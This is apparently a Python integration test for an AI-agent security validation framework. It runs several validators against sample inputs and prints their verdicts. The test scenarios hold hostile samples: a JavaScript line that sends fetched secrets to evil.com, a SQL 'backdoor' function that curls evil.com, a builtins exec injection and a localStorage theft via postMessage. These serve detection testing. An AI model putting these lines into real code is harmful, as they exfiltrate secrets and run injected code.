#!/usr/bin/env python3
"""
🚀 COMPLETE INTEGRATION TEST 🚀
Comprehensive test showing enhanced adaptive learning working with hybrid validation and the main framework.
"""

import sys
import os
sys.path.append(os.path.join(os.path.dirname(__file__), 'tbh_secure_agents'))

from tbh_secure_agents.security_validation import (
    get_next_gen_adaptive_validator,
    HybridValidator,
    SecurityValidator,
    enable_hybrid_validation
)

def test_complete_integration():
    """Test the complete integration of all security components."""
    print("🚀 COMPLETE SECURITY INTEGRATION TEST 🚀\n")
    
    print("📊 PHASE 1: COMPONENT INITIALIZATION\n")
    
    # Initialize all security components
    print("🧠 Initializing Enhanced Adaptive Learning:")
    adaptive_validator = get_next_gen_adaptive_validator()
    adaptive_engine = adaptive_validator.engine
    print(f"   ✅ Next-Gen Adaptive Validator initialized")
    print(f"   📊 Enhanced Patterns: {len(adaptive_engine.enhanced_patterns)}")
    print(f"   🎭 Behavioral Profiles: {len(adaptive_engine.behavioral_profiles)}")
    print(f"   🔬 Advanced ML: {'ENABLED' if adaptive_engine.enable_advanced_ml else 'DISABLED'}")
    
    print("\n🔄 Initializing Hybrid Validation:")
    hybrid_validator = HybridValidator()
    print(f"   ✅ Hybrid Validator initialized")
    print(f"   ⚡ Parallel Processing: {hybrid_validator.use_parallel}")
    print(f"   💾 Cache Size: {hybrid_validator.max_cache_size}")
    
    print("\n🛡️ Initializing Security Validator:")
    security_validator = SecurityValidator(interactive=False)
    print(f"   ✅ Security Validator initialized")
    
    print("\n🔗 Enabling Framework Integration:")
    try:
        enable_hybrid_validation()
        print("   ✅ Framework integration enabled")
    except Exception as e:
        print(f"   ⚠️ Framework integration issue: {e}")
    
    print("\n📊 PHASE 2: MULTI-LAYER SECURITY TESTING\n")
    
    # Test cases that demonstrate different security layers
    test_scenarios = [
        {
            "name": "Python Code Injection",
            "text": "import __builtins__; exec(__builtins__.__dict__['eval']('malicious_payload'))",
            "context": {
                "security_level": "standard",
                "user_id": "developer_1",
                "content_type": "python_code",
                "context_indicators": ["builtin_manipulation", "code_execution"]
            },
            "expected": "Should be detected by adaptive learning"
        },
        {
            "name": "JavaScript Data Exfiltration",
            "text": "fetch('/api/secrets').then(r=>navigator.sendBeacon('//evil.com', r.text()))",
            "context": {
                "security_level": "high",
                "user_id": "frontend_dev",
                "content_type": "javascript",
                "context_indicators": ["api_access", "data_exfiltration"]
            },
            "expected": "Should be caught by hybrid validation"
        },
        {
            "name": "SQL Function Injection",
            "text": "CREATE FUNCTION backdoor() RETURNS void AS $$ import subprocess; subprocess.call(['curl', 'evil.com']) $$ LANGUAGE plpython3u;",
            "context": {
                "security_level": "maximum",
                "user_id": "dba_user",
                "content_type": "sql",
                "context_indicators": ["function_creation", "subprocess_call"]
            },
            "expected": "Should be detected by multiple layers"
        },
        {
            "name": "Legitimate Code Request",
            "text": "Please help me write a Python function to calculate the factorial of a number",
            "context": {
                "security_level": "standard",
                "user_id": "student_1",
                "content_type": "request",
                "context_indicators": ["legitimate_request", "educational"]
            },
            "expected": "Should pass all security checks"
        }
    ]
    
    print("🔍 Testing Multi-Layer Security Detection:\n")
    
    for i, scenario in enumerate(test_scenarios, 1):
        print(f"🧪 Scenario {i}: {scenario['name']}")
        print(f"   Input: {scenario['text'][:60]}...")
        print(f"   Expected: {scenario['expected']}")
        
        # Test with adaptive validator
        print("   🧠 Adaptive Learning:")
        adaptive_result = adaptive_validator.validate(scenario['text'], scenario['context'])
        adaptive_secure = adaptive_result['is_secure']
        adaptive_conf = adaptive_result.get('confidence', 0)
        adaptive_anomaly = adaptive_result.get('behavioral_anomaly_score', 0)
        
        print(f"      Result: {'✅ SECURE' if adaptive_secure else '❌ THREAT'}")
        print(f"      Confidence: {adaptive_conf:.3f}")
        print(f"      Anomaly Score: {adaptive_anomaly:.3f}")
        
        if not adaptive_secure:
            threats = adaptive_result.get('threats', [])
            if threats:
                print(f"      Threat Type: {threats[0]['category']}")
        
        # Test with hybrid validator
        print("   🔄 Hybrid Validation:")
        hybrid_result = hybrid_validator.validate(scenario['text'], scenario['context'])
        hybrid_secure = hybrid_result['is_secure']
        hybrid_method = hybrid_result.get('method', 'unknown')
        hybrid_metrics = hybrid_result.get('validation_metrics', {})
        
        print(f"      Result: {'✅ SECURE' if hybrid_secure else '❌ THREAT'}")
        print(f"      Method: {hybrid_method}")
        print(f"      Time: {hybrid_metrics.get('total_time', 0)*1000:.1f}ms")
        
        # Test with security validator
        print("   🛡️ Security Validation:")
        security_secure, error_details = security_validator.validate_prompt(
            scenario['text'], 
            scenario['context']['security_level']
        )
        
        print(f"      Result: {'✅ SECURE' if security_secure else '❌ THREAT'}")
        if error_details:
            print(f"      Error: {error_details.get('error_code', 'unknown')}")
        
        # Consensus analysis
        results = [adaptive_secure, hybrid_secure, security_secure]
        if all(results):
            consensus = "✅ ALL SECURE"
        elif not any(results):
            consensus = "❌ ALL THREAT"
        else:
            consensus = "⚠️ MIXED RESULTS"
        
        print(f"   🎯 Consensus: {consensus}")
        print()
    
    print("📊 PHASE 3: ADAPTIVE LEARNING DEMONSTRATION\n")
    
    # Demonstrate adaptive learning over time
    print("🧠 Demonstrating Adaptive Learning Evolution:")
    
    learning_scenario = {
        "text": "document.createElement('iframe').contentWindow.postMessage({steal: localStorage}, '*')",
        "base_context": {
            "security_level": "standard",
            "user_id": "adaptive_learner",
            "content_type": "javascript",
            "context_indicators": ["dom_manipulation", "postmessage_attack"]
        }
    }
    
    print(f"   📝 Learning Scenario: DOM-based localStorage theft")
    print(f"   👤 User: {learning_scenario['base_context']['user_id']}")
    
    # Multiple exposures to show learning
    for exposure in range(1, 6):
        context = learning_scenario['base_context'].copy()
        context['exposure_round'] = exposure
        context['user_behavior'] = {
            'exposure_count': exposure,
            'dom_manipulation': True,
            'storage_access': True
        }
        
        result = adaptive_validator.validate(learning_scenario['text'], context)
        
        print(f"   Exposure {exposure}:")
        print(f"      Secure: {'✅ YES' if result['is_secure'] else '❌ NO'}")
        print(f"      Confidence: {result.get('confidence', 0):.3f}")
        print(f"      Anomaly: {result.get('behavioral_anomaly_score', 0):.3f}")
        print(f"      Patterns: {len(adaptive_engine.enhanced_patterns)}")
        print(f"      Profiles: {len(adaptive_engine.behavioral_profiles)}")
    
    print("\n📊 PHASE 4: PERFORMANCE COMPARISON\n")
    
    # Performance comparison across all validators
    print("⚡ Performance Comparison:")
    
    import time
    
    perf_test = "eval(input('Enter code: '))"
    perf_context = {"security_level": "standard", "user_id": "perf_test"}
    
    # Adaptive validator
    start = time.time()
    adaptive_perf = adaptive_validator.validate(perf_test, perf_context)
    adaptive_time = (time.time() - start) * 1000
    
    # Hybrid validator
    start = time.time()
    hybrid_perf = hybrid_validator.validate(perf_test, perf_context)
    hybrid_time = (time.time() - start) * 1000
    
    # Security validator
    start = time.time()
    security_perf, _ = security_validator.validate_prompt(perf_test, "standard")
    security_time = (time.time() - start) * 1000
    
    print(f"   🧠 Adaptive Learning: {adaptive_time:.1f}ms")
    print(f"   🔄 Hybrid Validation: {hybrid_time:.1f}ms")
    print(f"   🛡️ Security Validation: {security_time:.1f}ms")
    
    # Determine fastest
    times = [
        ("Adaptive", adaptive_time),
        ("Hybrid", hybrid_time),
        ("Security", security_time)
    ]
    fastest = min(times, key=lambda x: x[1])
    print(f"   🏆 Fastest: {fastest[0]} ({fastest[1]:.1f}ms)")
    
    print("\n📊 PHASE 5: INTEGRATION SUMMARY\n")
    
    # Final integration summary
    print("🎯 INTEGRATION ANALYSIS:")
    
    # Check adaptive learning stats
    final_patterns = len(adaptive_engine.enhanced_patterns)
    final_profiles = len(adaptive_engine.behavioral_profiles)
    evolved_patterns = len([p for p in adaptive_engine.enhanced_patterns.values() if p.frequency > 1])
    
    print(f"   🧠 Adaptive Learning:")
    print(f"      Enhanced Patterns: {final_patterns}")
    print(f"      Behavioral Profiles: {final_profiles}")
    print(f"      Evolved Patterns: {evolved_patterns}")
    print(f"      Attack History: {len(adaptive_engine.attack_history)}")
    
    # Check hybrid validation stats
    print(f"   🔄 Hybrid Validation:")
    print(f"      Cache Size: {len(hybrid_validator.cache)}")
    print(f"      Parallel Processing: {hybrid_validator.use_parallel}")
    
    # Integration health check
    integration_health = []
    
    if final_profiles > 0:
        integration_health.append("✅ Behavioral learning active")
    else:
        integration_health.append("⚠️ Limited behavioral learning")
    
    if evolved_patterns > 0:
        integration_health.append("✅ Pattern evolution working")
    else:
        integration_health.append("⚠️ Limited pattern evolution")
    
    if len(adaptive_engine.attack_history) > 0:
        integration_health.append("✅ Attack history tracking")
    else:
        integration_health.append("⚠️ No attack history")
    
    if fastest[1] < 10:  # Sub-10ms performance
        integration_health.append("✅ High performance maintained")
    else:
        integration_health.append("⚠️ Performance could be improved")
    
    print(f"   🏥 Integration Health:")
    for health_item in integration_health:
        print(f"      {health_item}")
    
    # Calculate overall score
    positive_items = len([item for item in integration_health if item.startswith("✅")])
    total_items = len(integration_health)
    health_score = (positive_items / total_items) * 100
    
    print(f"\n🎊 OVERALL INTEGRATION SCORE: {positive_items}/{total_items} ({health_score:.1f}%)")
    
    if health_score >= 75:
        print("🚀 EXCELLENT: Enhanced adaptive learning is fully integrated and working optimally!")
        return True
    elif health_score >= 50:
        print("✅ GOOD: Integration is working well with room for improvement")
        return True
    else:
        print("⚠️ NEEDS WORK: Integration has significant issues")
        return False

if __name__ == "__main__":
    success = test_complete_integration()
    print(f"\n🎯 FINAL INTEGRATION STATUS: {'SUCCESS' if success else 'NEEDS IMPROVEMENT'}")
    
    if success:
        print("\n🎉 The enhanced adaptive learning system is successfully integrated with:")
        print("   🧠 Next-generation behavioral analysis")
        print("   🔄 Hybrid validation (Regex + ML + LLM)")
        print("   🛡️ Framework security validation")
        print("   ⚡ High-performance real-time learning")
        print("   🎯 Context-aware threat detection")
        print("\n🚀 Ready for production deployment! 🚀")
